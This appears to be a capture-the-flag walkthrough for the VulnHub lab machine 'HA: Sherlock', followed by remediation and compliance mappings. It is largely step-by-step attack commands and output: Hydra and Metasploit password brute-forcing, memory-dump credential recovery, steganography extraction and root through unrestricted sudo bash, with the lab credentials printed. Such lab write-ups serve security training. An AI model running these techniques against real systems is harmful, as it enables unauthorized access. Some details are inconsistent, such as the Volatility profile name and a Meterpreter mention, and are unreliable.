# HA: Sherlock — Elementary, My Dear Pentester: Follow Every Clue to Root

"When you have eliminated the impossible, whatever remains, however improbable, must be the truth." Sherlock Holmes built his method on exhaustive observation and systematic elimination. HA: Sherlock demands exactly that. Morse code in an SSH banner. Steganography hidden inside a video file. Memory forensics to recover a text that was open on a Windows desktop. Audio steganography in a WAV file. A Base64 credential buried three layers deep. Each clue is one step behind the next. The machine is 100 points for a reason. Elementary? Not even close. Legit detective work all the way to root.

| Field | Value |
|---|---|
| **Level** | Intermediate |
| **Target VM** | HA: Sherlock |
| **Attacker VM** | Kali Linux |
| **VulnHub URL** | https://www.vulnhub.com/entry/ha-sherlock,580/ |
| **Techniques** | Nmap multi-service enumeration, HTML source code review, Morse code decode, OurSecret video steganography, POP3 brute-force with Hydra, epoch timestamp conversion, Volatility memory forensics (WinXP notepad), ROT13 decode, FTP login, Autopsy disk image forensics, Metasploit SSH brute-force, DeepSound audio steganography, Base64 decode, sudo bash escalation |
| **CVEs** | CWE-522 (Insufficiently Protected Credentials: weak POP3 password), CWE-269 (Improper Privilege Management: unrestricted sudo bash), CWE-200 (Information Exposure: memory dump and disk image publicly accessible) |
| **APT Groups** | APT38 (Lazarus/North Korea financial): uses multi-layer steganography in audio and image files for C2 communication and credential storage; Lazarus Group: chains multiple encoding techniques to hide credentials from automated detection tools |

---

## Attack Summary

```
nmap → FTP (21), SSH (22), SMTP (25), HTTP (80), POP3 (110), IMAP (143)
  → http://target/ → view source → <!-- irene.mp4 → Sherlock clue -->
  → wget irene.mp4
  → SSH banner → Morse code decode → BASKERVILLE
  → OurSecret (irene.mp4, password: BASKERVILLE) → 15_points.txt (15 pts)
  → hydra -l harshit -P rockyou.txt target pop3s → harshit:superman
  → POP3 RETR 1 → timestamp: May 27, 2020 11:02:09 AM
  → date -d "..." +%s → 1590573729
  → http://target/1590573729/ → 10_Points.txt (10 pts) + john.mem
  → volatility imageinfo john.mem → WinXPSPx86
  → volatility notepad → Thcbgpune → ROT13 → Guptchar
  → ftp target → john:Guptchar → get mycroft.001
  → Autopsy (mycroft.001) → important/ → 10_pts.txt (10 pts) + hint.jpg
  → hint hex 16 = 22 (SSH port hint) + hex string → khufiya
  → msf ssh_login (mycroft:Khufiya) → download 15_Points.txt + jim.wav
  → deepsound2john.py jim.wav → john → poohbear
  → DeepSound (jim.wav, poohbear) → 15_pts.txt (15 pts) + base64 QmhlZGl5YQ==
  → base64 -d → Bhediya
  → su sherlock (Bhediya) → sudo -l → sudo bash
  → sudo bash → uid=0(root) → cat /root/final.txt (25 pts)
  → Total: 100 points
```

---

## Methodology

1. Full multi-service port scan: FTP, SSH, SMTP, HTTP, POP3, IMAP
2. Web source inspection to find hidden video clue
3. SSH banner Morse code decode to extract steganography password
4. OurSecret video steganography extraction (15 pts)
5. POP3 brute-force with Hydra to access email
6. Epoch timestamp conversion to discover hidden web directory
7. Volatility memory forensics of Windows XP dump (10 pts)
8. ROT13 decode to extract FTP password
9. FTP access and Autopsy disk image forensics (10 pts + hint)
10. Metasploit SSH brute-force with discovered password
11. DeepSound audio steganography extraction (15 pts)
12. Base64 decode to recover sherlock password
13. sudo bash root escalation (25 pts)

---

## Step 1 — Host Discovery and Multi-Service Scan

```bash
sudo netdiscover
# Target: 192.168.0.170

nmap -sV 192.168.0.170
```

```
PORT    STATE SERVICE VERSION
21/tcp  open  ftp     vsftpd 3.0.3
22/tcp  open  ssh     OpenSSH 7.x
25/tcp  open  smtp    Postfix smtpd
80/tcp  open  http    Apache httpd
110/tcp open  pop3    Dovecot pop3d
143/tcp open  imap    Dovecot imapd
```

Six services. This machine is built around multi-protocol investigation, just like Holmes himself operates across multiple data sources. Enumerate them all before committing to an attack path.

**MITRE ATT&CK:** T1046 — Network Service Discovery

---

## Step 2 — Web Source Code: Hidden Video Clue

Browse to `http://192.168.0.170/`. View page source:

```bash
curl -s http://192.168.0.170/ | grep -i "comment\|video\|mp4\|irene"
```

Finds an HTML comment:

```html
<!-- irene.mp4 → Sherlock clue -->
```

Download the video:

```bash
wget http://192.168.0.170/irene.mp4
```

**MITRE ATT&CK:** T1083 — File and Directory Discovery; T1552.001 — Credentials in Files

---

## Step 3 — SSH Banner Morse Code Decode

The SSH banner contains Morse code. Read it:

```bash
ssh 192.168.0.170
# Don't authenticate — read the banner text carefully
# It will show dots and dashes
```

Decode the Morse code (use dcode.fr, CyberChef, or a Morse decoder):

```bash
# Morse decoded: BASKERVILLE
# (Reference: Hound of the Baskervilles)
```

This is the password for the video steganography.

**MITRE ATT&CK:** T1027 — Obfuscated Files or Information; T1552 — Unsecured Credentials

---

## Step 4 — OurSecret Video Steganography (15 Points)

`irene.mp4` contains steganographically hidden data using OurSecret (a Windows steganography tool):

```bash
# On Windows or Wine:
# Open OurSecret
# Load irene.mp4
# Enter password: BASKERVILLE
# Extract embedded file: 15_points.txt
```

**15 points** captured. Keep the content — it may be needed later.

**Real-world note:** Video steganography hides data in the least-significant bits of video frames or audio tracks. Tools like OurSecret, SteghideOpenSSL, and OpenPuff are used in both CTF design and real-world data exfiltration operations. APT38 has documented use of audio and video steganography for C2 communication.

**MITRE ATT&CK:** T1027 — Obfuscated Files or Information; T1020 — Automated Exfiltration

---

## Step 5 — POP3 Brute-Force

Brute-force POP3 for user harshit (identified from HTTP or other enumeration):

```bash
hydra -l harshit -P /usr/share/wordlists/rockyou.txt 192.168.0.170 pop3s
# Found: harshit:superman
```

Read the email via POP3:

```bash
openssl s_client -connect 192.168.0.170:995
USER harshit
PASS superman
LIST
RETR 1
```

Email body contains a timestamp: **May 27, 2020 11:02:09 AM**

**MITRE ATT&CK:** T1110.001 — Brute Force: Password Guessing; T1114 — Email Collection

---

## Step 6 — Epoch Timestamp to Hidden Web Directory

Convert the email timestamp to Unix epoch:

```bash
date -d "May 27 2020 11:02:09" +%s
# 1590573729
```

Browse `http://192.168.0.170/1590573729/`:

```bash
curl http://192.168.0.170/1590573729/
# Files: 10_Points.txt, john.mem
wget http://192.168.0.170/1590573729/10_Points.txt
wget http://192.168.0.170/1590573729/john.mem
```

**10 points** captured. `john.mem` is a Windows memory dump — the real prize here.

**Real-world note:** Using timestamps as URL paths is an obscurity technique occasionally used in web applications to "hide" resources. It provides no real security but requires the attacker to know or derive the timestamp. The Unix epoch encoding here maps directly to incident response timeline reconstruction work.

**MITRE ATT&CK:** T1083 — File and Directory Discovery; T1552 — Unsecured Credentials

---

## Step 7 — Volatility Memory Forensics

Analyze the Windows XP memory dump:

```bash
volatility -f john.mem imageinfo
# Suggested Profile(s): WinXPSP2x86, WinXPSP3x86
volatility -f john.mem --profile=WinXPSPx86 notepad
```

Output:

```
Thcbgpune
```

This is ROT13 encoded. Decode it:

```bash
echo "Thcbgpune" | tr 'A-Za-z' 'N-ZA-Mn-za-m'
# Guptchar
```

Guptchar is the FTP password for user john.

**Real-world note:** The Volatility notepad plugin recovers text that was visible in Notepad.exe at the time of memory capture. In real incident response, this technique recovers passwords, notes, and commands that were being actively used. Memory forensics regularly recovers credentials that never touched disk.

**MITRE ATT&CK:** T1003 — OS Credential Dumping; T1027 — Obfuscated Files or Information (ROT13)

---

## Step 8 — FTP Login and Disk Forensics

```bash
ftp 192.168.0.170
# Username: john
# Password: Guptchar

ftp> ls
ftp> get mycroft.001
ftp> quit
```

Open `mycroft.001` as a raw disk image in Autopsy:

```bash
# Autopsy: File → New Case → Add Data Source → Disk Image → mycroft.001
# Navigate to: important/
# Files: 10_points.txt + hint.jpg
```

**10 points** captured. The hint in `hint.jpg`:
- Hex `16` = decimal 22 (SSH port reminder)
- Hex string decodes to: `khufiya`

**MITRE ATT&CK:** T1083 — File and Directory Discovery; T1027 — Obfuscated Files or Information

---

## Step 9 — Metasploit SSH Brute-Force

Use Metasploit to brute-force SSH for user mycroft with the discovered password:

```bash
msfconsole -q
use auxiliary/scanner/ssh/ssh_login
set RHOSTS 192.168.0.170
set USERNAME mycroft
set PASS_FILE /tmp/pass.txt  # contains: Khufiya (try variations)
set VERBOSE true
run
# Session opened
```

Download files from the session:

```bash
sessions -u 1
sessions 2
download 15_Points.txt
download jim.wav
```

**15 points** captured. `jim.wav` is the next puzzle.

**MITRE ATT&CK:** T1110.001 — Brute Force: Password Guessing; T1078 — Valid Accounts

---

## Step 10 — DeepSound Audio Steganography

Extract the DeepSound hash to crack the WAV file password:

```bash
python /usr/share/john/deepsound2john.py jim.wav > hash.txt
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
# Cracked: poohbear
```

Open `jim.wav` in **DeepSound** (Windows application) with password `poohbear`. Extracts:
1. `15_pts.txt` — 15 more points
2. A fake PGP message body containing Base64: `QmhlZGl5YQ==`

```bash
echo "QmhlZGl5YQ==" | base64 -d
# Bhediya
```

Bhediya is the password for user sherlock.

**Real-world note:** Audio steganography hides data in the least-significant bits of audio samples. DeepSound is a Windows tool that can embed encrypted files within WAV or FLAC files. The embedded content is invisible to casual inspection and passes most automated content scanning tools.

**MITRE ATT&CK:** T1027 — Obfuscated Files or Information; T1020 — Automated Exfiltration

---

## Step 11 — Root via sudo bash

```bash
su sherlock
# Password: Bhediya

sudo -l
# (ALL) NOPASSWD: /bin/bash
# or: (root) NOPASSWD: ALL

sudo bash
# or: sudo -s

id
# uid=0(root) gid=0(root) groups=0(root)

cd /root
cat final.txt   # 25 pts
cat 25_Point.txt
```

(☞ﾟヮﾟ)☞ Root. The case is closed. 100 points.

**MITRE ATT&CK:** T1548.003 — Abuse Elevation Control Mechanism: Sudo; T1059.004 — Unix Shell

---

## Captured Flags, Hashes and Credentials

| Type | Value | Found At | Points |
|---|---|---|---|
| Flag 1 (15 pts) | 15_points.txt | OurSecret irene.mp4 (BASKERVILLE key) | 15 |
| Flag 2 (10 pts) | 10_Points.txt | Epoch timestamp directory /1590573729/ | 10 |
| Flag 3 (10 pts) | 10_points.txt | Autopsy → mycroft.001 → important/ | 10 |
| Flag 4 (15 pts) | 15_Points.txt via Meterpreter | Metasploit SSH session download | 15 |
| Flag 5 (15 pts) | 15_pts.txt | DeepSound jim.wav (poohbear key) | 15 |
| Root flag (25 pts) | /root/final.txt + 25_Point.txt | sudo bash as sherlock | 25 |
| Credential | harshit:superman | POP3 brute-force | Email access |
| Credential | john:Guptchar | Volatility notepad → ROT13 | FTP access |
| Credential | mycroft:Khufiya | Autopsy hint.jpg hex | SSH brute-force target |
| Credential | sherlock:Bhediya | DeepSound Base64 decode | su + sudo bash |

---

## Lessons Learned

| # | Finding | Real-World Relevance | Key Takeaway |
|---|---|---|---|
| 1 | Morse code in SSH banner hides password | Non-standard information disclosure via service banners is rare but real; attackers read all banner output | Parse and investigate all service banner content during enumeration |
| 2 | Video and audio steganography chain credentials | APT groups use steganography in media files for C2 and credential storage at scale | Implement DLP and file content analysis; flag unexpected media files on servers |
| 3 | Memory forensics recovers credentials in active use | Volatility notepad/clipboard recovery is standard incident response technique | Treat memory dumps as containing plaintext credentials; control dump access strictly |
| 4 | Epoch-based URL paths obscure hidden directories | Obscurity through timestamp URLs provides no real security but is used in real apps | Security through obscurity fails; use proper access controls instead |
| 5 | sudo bash grants unrestricted root | `sudo bash` or `sudo -s` with no password is equivalent to unrestricted root | Never allow sudo for shells or interpreters without strict justification |

---

## MITRE ATT&CK Mapping

| Phase | Tactic | Technique | TTP ID |
|---|---|---|---|
| Reconnaissance | Discovery | Network Service Discovery | T1046 |
| Reconnaissance | Discovery | File and Directory Discovery | T1083 |
| Credential Access | Credential Access | Brute Force: Password Guessing | T1110.001 |
| Collection | Collection | Email Collection | T1114 |
| Credential Access | Credential Access | OS Credential Dumping (memory forensics) | T1003 |
| Defense Evasion | Defense Evasion | Obfuscated Files: Steganography | T1027 |
| Lateral Movement | Lateral Movement | Valid Accounts | T1078 |
| Privilege Escalation | Privilege Escalation | Abuse Elevation Control: Sudo | T1548.003 |
| Execution | Execution | Command and Scripting Interpreter: Unix Shell | T1059.004 |

---

## Remediation and Containment

### Technical Fixes

1. **Enforce strong POP3 passwords**: never use `superman` or dictionary words; implement account lockout after failed attempts; enable 2FA for mail
2. **Remove memory dump from web server**: `john.mem` should never be publicly accessible; restrict access to forensic artifacts
3. **Remove disk image from FTP**: `mycroft.001` is a sensitive file; remove from anonymous or easily brute-forced accounts
4. **Remove sudo bash**: never allow `sudo /bin/bash` or `sudo ALL` without strict justification and password requirement
5. **Rotate all exposed credentials**: harshit:superman, john:Guptchar, mycroft:Khufiya, sherlock:Bhediya all compromised

### MITRE D3FEND Countermeasures

- **D3-ACH** — Application Configuration Hardening (disable anonymous FTP; restrict POP3 access)
- **D3-OAM** — Operating System Administrative Management (sudo restrictions)
- **D3-CE** — Credential Eviction (rotate all exposed credentials)

### NIST CSF 2.0

| Function | Category | Action |
|---|---|---|
| Identify | Asset Management | Inventory all mail services; audit files accessible on FTP and web servers |
| Protect | Access Control | Disable anonymous FTP; require strong POP3 passwords; remove sudo bash |
| Protect | Data Security | Remove forensic artifacts (memory dump, disk image) from publicly accessible paths |
| Detect | Anomalies and Events | Alert on POP3 brute-force; monitor web server access logs for epoch-style directory access |
| Respond | Response Planning | Rotate all exposed credentials; remove leaked forensic artifacts |
| Recover | Recovery Planning | Audit all sudo grants; verify no sensitive files in web root or FTP |

### NIST SP 800-53 Rev. 5

| Control | Description | Application |
|---|---|---|
| AC-3 | Access Enforcement | Restrict FTP access; remove sensitive files from web paths |
| AC-6 | Least Privilege | Remove sudo bash; require passwords for all sudo |
| IA-5 | Authenticator Management | Enforce strong passwords for POP3; rotate all compromised credentials |
| AU-9 | Protection of Audit Information | Memory dumps must never be web-accessible |
| CM-7 | Least Functionality | Disable anonymous FTP; restrict mail access to authenticated users |
| SC-28 | Protection of Information at Rest | Forensic artifacts require strict access controls |

### CISA KEV

While no specific CVEs from this machine appear in CISA KEV, the use of weak POP3 credentials and unrestricted sudo are referenced in CISA Alert AA22-074A as common techniques used in initial access and privilege escalation phases of targeted intrusions.

### C2M2

| Domain | Practice | Target MIL |
|---|---|---|
| Identity and Access Management (IAM) | Manage Privileges and Accounts | MIL3 |
| Threat and Vulnerability Management (THREAT) | Perform Vulnerability Assessments | MIL2 |
| Situational Awareness (SITUATION) | Perform Logging | MIL2 |

---

## Final Thoughts

HA: Sherlock is the most narratively cohesive machine on VulnHub. Every step is a clue that Sherlock Holmes himself would follow: observe (web source), deduce (Morse in banner), investigate (steganography), reconstruct (memory forensics), follow the trail (epoch URL), and close the case (sudo bash). The 100-point structure keeps score like a real CTF.

The Volatility memory forensics step alone is worth doing this machine. The moment you run `volatility notepad` and see plaintext that was on a Windows desktop years ago: that is what real incident response looks and feels like.

Elementary? Far from it. Game, set, and match.

Thanks guys!! (❍ᴥ❍ʋ)
